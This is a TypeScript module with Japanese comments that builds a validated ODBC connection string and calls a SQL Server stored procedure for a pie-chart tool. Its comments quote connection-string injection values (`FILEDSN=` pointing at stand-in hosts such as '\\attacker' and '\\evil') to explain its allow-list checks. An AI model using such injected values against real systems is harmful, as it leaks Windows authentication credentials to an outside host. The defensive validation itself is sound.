// =============================================================================
// input/db.ts — SQL Server のストアドを呼び、2 列(name, value)を読み込む
// -----------------------------------------------------------------------------
// 仕様:
//   - 呼ぶのは 1 本のストアド。値(ファンドコード・基準日・グラフ種別)は位置バインドで渡し、
//     文へ文字列補間しない。文へ埋め込むのはストアド名だけで、形は `sprocArgs.ts` が検査する。
//   - 読むだけであることは、ストアドの中身と DB 側の権限設計で担保する。pie-chart 側に
//     その境界は無い。
//   - 接続文字列に入る値(driver / server / database / extra)は許可リストで検証する。
//     ODBC 接続文字列は `;` 区切りの key=value 列で、値の中の `;` はそのまま新しい
//     キーワードの開始になる(`FILEDSN=\\attacker\share\a.dsn` の注入で統合認証の
//     チャレンジレスポンスが外へ出る)。
//   - 結果は列のある結果セットがちょうど 1 つ、先頭 2 列が name / value。
// 接続は Windows 統合認証(`Trusted_Connection=yes`)固定で、資格情報は持たない。
// ドライバ(msnodesqlv8)は引数で受け取る。読み込み方は開発版と exe で違うため
// (`runtime/msDriver.ts` / `runtime/dbChild.ts`)、ここは呼び出しと判定だけを持つ。
// =============================================================================

import { MAX_DB_ROWS } from '../limits.js';
import { DbStageError, errorMessage } from './dbStage.js';
import { rowToItem } from './number.js';
import { SPROC_PARAM_NAMES, type SprocArgs } from './sprocArgs.js';

export interface ConnOpts {
  /** 接続先サーバ。未指定は env `DB_SERVER`、既定 `localhost`。 */
  server?: string;
  /** データベース名。未指定は env `DB_NAME`(これも無ければエラー)。 */
  database?: string;
  /** ODBC ドライバ名。未指定は env `DB_ODBC_DRIVER`、既定 `ODBC Driver 17 for SQL Server`。 */
  driver?: string;
  /** 追加の接続文字列断片。未指定は env `DB_CONN_EXTRA`。許可リストのキーワードだけを並べる。 */
  extra?: string;
}

/** 検証済みの接続先。JSON の `source` に server / database を記録するためにも使う。 */
export interface ConnTarget {
  driver: string;
  server: string;
  database: string;
  extra: string;
}

// ── 1. 接続文字列(値はすべて許可リスト) ──────────────────────────────────────

/**
 * 受け入れる ODBC ドライバ名。**完全一致の集合メンバシップ**で、`startsWith` や
 * 「`for SQL Server` を含む」のような述語へ緩めない(緩めた瞬間に `};FILEDSN=...` の
 * ような値が名前の一部として通る)。実在するドライバ名だけを列挙する。
 */
const ALLOWED_ODBC_DRIVERS: ReadonlySet<string> = new Set([
  'ODBC Driver 18 for SQL Server',
  'ODBC Driver 17 for SQL Server',
  'ODBC Driver 13.1 for SQL Server',
  'ODBC Driver 13 for SQL Server',
  'ODBC Driver 11 for SQL Server',
  'SQL Server Native Client 11.0',
  'SQL Server',
]);

/**
 * `Server` の形: `[tcp:]host[\instance][,port]`。host は名前 / IP / `(localdb)`。
 * `;` `{` `}` `=` `\\`(UNC の起点)を 1 文字も含めないことが要点で、これが無いと
 * `localhost;FILEDSN=\\evil\s\x.dsn` がキーワード注入になる。
 */
const SERVER_RE = /^(?:tcp:)?(?:\(localdb\)|[A-Za-z0-9._-]+)(?:\\[A-Za-z0-9._$-]+)?(?:,\d{1,5})?$/;

/** `Database` の形: SQL Server の通常識別子相当(先頭は文字か `_`)。 */
const DATABASE_RE = /^[\p{L}_][\p{L}\p{N}_$#-]{0,127}$/u;

/**
 * `extra` に置けるキーワードと、その値の形。自由記述の追記口を残すと接続文字列の
 * 組み立て全体が無意味になるため、**必要なものだけ**をここへ足す方式に縮退させている。
 * キーの照合は大小無視で、出力は正規形(このマップのキー)で書き直す。
 */
const EXTRA_KEYWORDS: ReadonlyMap<string, RegExp> = new Map([
  ['Encrypt', /^(?:yes|no|mandatory|optional|strict)$/i],
  ['TrustServerCertificate', /^(?:yes|no)$/i],
  ['ApplicationIntent', /^(?:ReadOnly|ReadWrite)$/i],
  ['MultiSubnetFailover', /^(?:yes|no)$/i],
  ['Connection Timeout', /^\d{1,4}$/],
  ['Login Timeout', /^\d{1,4}$/],
]);

/**
 * ODBC の接続文字列文法で値を波括弧で囲えるのは **`DRIVER` キーワードだけ**
 * (`attribute ::= attribute-keyword=attribute-value | DRIVER=[{]attribute-value[}]`)。
 * 規約どおり内部の `}` は `}}` へ二重化する。`Server` / `Database` を同じように囲むと
 * ドライバは括弧込みの値として受け取るため、そちらは囲まず上の文字種検査で守る。
 */
function odbcBraceValue(value: string): string {
  const escaped = value.replace(/}/g, '}}');
  return `{${escaped}}`;
}

/** `extra` を許可リストで検証し、正規形の `key=value;` 列へ組み直す。 */
export function normalizeConnExtra(extra: string): string {
  const parts = extra
    .split(';')
    .map((part) => part.trim())
    .filter((part) => part !== '');
  const canonicalKeys = new Map([...EXTRA_KEYWORDS.keys()].map((key) => [key.toLowerCase(), key]));
  return parts
    .map((part) => {
      const eq = part.indexOf('=');
      if (eq <= 0) {
        throw new Error(`Invalid connection extra fragment: "${part}" (expected "key=value").`);
      }
      const rawKey = part.slice(0, eq).trim();
      const value = part.slice(eq + 1).trim();
      const key = canonicalKeys.get(rawKey.toLowerCase());
      if (key === undefined) {
        throw new Error(
          `Connection keyword "${rawKey}" is not allowed ` +
            `(allowed: ${[...EXTRA_KEYWORDS.keys()].join(', ')}).`,
        );
      }
      if (!EXTRA_KEYWORDS.get(key)!.test(value)) {
        throw new Error(`Invalid value for connection keyword "${key}": "${value}".`);
      }
      return `${key}=${value};`;
    })
    .join('');
}

/**
 * 接続先を env で補完し、すべて許可リストへ通す。値の出所は CLI フラグと環境変数
 * (= 呼び出し側の入力)なので、連結する前に検査する — 接続文字列を作る経路はここだけ。
 */
export function resolveConnTarget(opts: ConnOpts): ConnTarget {
  const driver = opts.driver ?? process.env.DB_ODBC_DRIVER ?? 'ODBC Driver 17 for SQL Server';
  if (!ALLOWED_ODBC_DRIVERS.has(driver)) {
    throw new Error(
      `Unknown ODBC driver: "${driver}" (allowed: ${[...ALLOWED_ODBC_DRIVERS].join(' / ')}).`,
    );
  }
  const server = opts.server ?? process.env.DB_SERVER ?? 'localhost';
  if (!SERVER_RE.test(server)) {
    throw new Error(`Invalid server: "${server}" (expected host[\\instance][,port]).`);
  }
  const database = opts.database ?? process.env.DB_NAME;
  if (!database) {
    throw new Error('database is required (pass --db-name or set DB_NAME).');
  }
  if (!DATABASE_RE.test(database)) {
    throw new Error(`Invalid database name: "${database}".`);
  }
  const extra = normalizeConnExtra(opts.extra ?? process.env.DB_CONN_EXTRA ?? '');
  return { driver, server, database, extra };
}

/** 検証済みの接続先から ODBC 接続文字列を作る。認証は Windows 統合認証固定。 */
export function connectionStringFor(t: ConnTarget): string {
  return `Driver=${odbcBraceValue(t.driver)};Server=${t.server};Database=${t.database};Trusted_Connection=yes;${t.extra}`;
}

/** `resolveConnTarget` と `connectionStringFor` をまとめて呼ぶ。 */
export function buildConnectionString(opts: ConnOpts): string {
  return connectionStringFor(resolveConnTarget(opts));
}

// ── 2. ストアドの呼び出しと結果の判定 ────────────────────────────────────────

/** msnodesqlv8 の `promises.query` の戻り値のうち、本ファイルが使う部分。 */
export interface MsSqlResults {
  /** 結果セットごとの列情報。件数だけの結果(NOCOUNT 無しの INSERT など)は空配列になりうる。 */
  meta: Array<Array<{ name: string }>>;
  /** 結果セットごとの行。`raw: true` で呼ぶので 1 行は列順の配列。 */
  results: unknown[][][];
}

/** msnodesqlv8 のうち本ファイルが使う部分だけを型付け(テストではフェイクを渡す)。 */
export interface MsSqlDriver {
  promises: {
    query(
      conn: string,
      sql: string,
      params: unknown[],
      options: { timeoutMs: number; raw: boolean },
    ): Promise<MsSqlResults>;
  };
}

export interface SprocCallOpts {
  connectionString: string;
  proc: string;
  args: SprocArgs;
  timeoutMs: number;
}

/** ストアドの呼び出し文。値は `?` の位置バインドで渡す(editor の `sproc.ts` と同じ形)。 */
export function buildSprocStatement(proc: string): string {
  const { fund, baseDate, chartType } = SPROC_PARAM_NAMES;
  return `EXEC ${proc} @${fund}=?, @${baseDate}=?, @${chartType}=?`;
}

/**
 * 列のある結果セットがちょうど 1 つであることを確かめ、その行を返す。最初の結果だけを
 * 拾うと、`SET NOCOUNT ON` の無いストアドで件数だけの空の結果を、途中に SELECT のある
 * ストアドで別の結果を取り違える。
 */
export function pickSingleResultSet(res: MsSqlResults): unknown[][] {
  const sets = res.meta
    .map((meta, i) => ({ meta, rows: res.results[i] ?? [] }))
    .filter((s) => s.meta.length > 0);
  if (sets.length === 0) {
    throw new DbStageError('query', 'The stored procedure returned no result set with columns.');
  }
  if (sets.length > 1) {
    throw new DbStageError(
      'query',
      `The stored procedure returned ${sets.length} result sets with columns; ` +
        'return exactly one (name, value).',
    );
  }
  const [{ meta, rows }] = sets;
  if (meta.length !== 2) {
    throw new DbStageError(
      'query',
      `The result set has ${meta.length} columns; return exactly 2 (name, value). ` +
        `Columns: ${meta.map((c) => c.name).join(', ')}.`,
    );
  }
  return rows as unknown[][];
}

/** 行(列順の配列)を `[name, value][]` にする。名前と値の解釈は xlsx 経路と共有。 */
export function rowsToItems(rows: unknown[][]): Array<[string, number]> {
  if (rows.length === 0) {
    throw new DbStageError('query', 'The stored procedure returned no rows.');
  }
  // 行 → 項目の変換に入る前に行数で切る(理由と射程は `limits.ts` の `MAX_DB_ROWS`)。
  if (rows.length > MAX_DB_ROWS) {
    throw new DbStageError(
      'query',
      `The stored procedure returned ${rows.length} rows (limit ${MAX_DB_ROWS}). ` +
        'Aggregate in the procedure so it returns one row per slice, ' +
        'or raise the limit with PIE_MAX_DB_ROWS=<n>.',
    );
  }
  const items: Array<[string, number]> = [];
  for (let i = 0; i < rows.length; i += 1) {
    const [nameRaw, valueRaw] = rows[i];
    const name = nameRaw == null ? '' : String(nameRaw).trim();
    const item = rowToItem(name, valueRaw, i + 1, () => String(valueRaw));
    if (item) items.push(item);
  }
  if (items.length === 0) {
    throw new DbStageError('query', 'No usable data rows (all blank).');
  }
  return items;
}

/**
 * ドライバの例外を段階付きにする。SQLSTATE `08`(接続)・`28`(認証)・`IM002`(ODBC ドライバ
 * 未導入)は接続の問題、それ以外はストアドの問題として扱う。
 */
export function classifySqlError(err: unknown): DbStageError {
  if (err instanceof DbStageError) return err;
  const raw = (err as { sqlstate?: unknown } | null)?.sqlstate;
  const sqlstate = typeof raw === 'string' ? raw : '';
  const isConnect = sqlstate.startsWith('08') || sqlstate.startsWith('28') || sqlstate === 'IM002';
  const message = errorMessage(err);
  return new DbStageError(
    isConnect ? 'connect' : 'query',
    sqlstate ? `${message} (SQLSTATE ${sqlstate})` : message,
  );
}

/** ストアドを呼び、`[name, value][]` を返す。失敗はすべて `DbStageError` で投げる。 */
export async function callSprocItems(
  driver: MsSqlDriver,
  opts: SprocCallOpts,
): Promise<Array<[string, number]>> {
  let res: MsSqlResults;
  try {
    res = await driver.promises.query(
      opts.connectionString,
      buildSprocStatement(opts.proc),
      [opts.args.fund, opts.args.baseDate, opts.args.chartType],
      { timeoutMs: opts.timeoutMs, raw: true },
    );
  } catch (err) {
    throw classifySqlError(err);
  }
  try {
    return rowsToItems(pickSingleResultSet(res));
  } catch (err) {
    if (err instanceof DbStageError) throw err;
    throw new DbStageError('query', errorMessage(err));
  }
}

/** `db-check --db-name` 用。固定の `SELECT 1` で接続だけを確かめる。 */
export async function checkConnection(
  driver: MsSqlDriver,
  connectionString: string,
  timeoutMs: number,
): Promise<void> {
  try {
    await driver.promises.query(connectionString, 'SELECT 1', [], { timeoutMs, raw: true });
  } catch (err) {
    throw new DbStageError('connect', classifySqlError(err).message);
  }
}
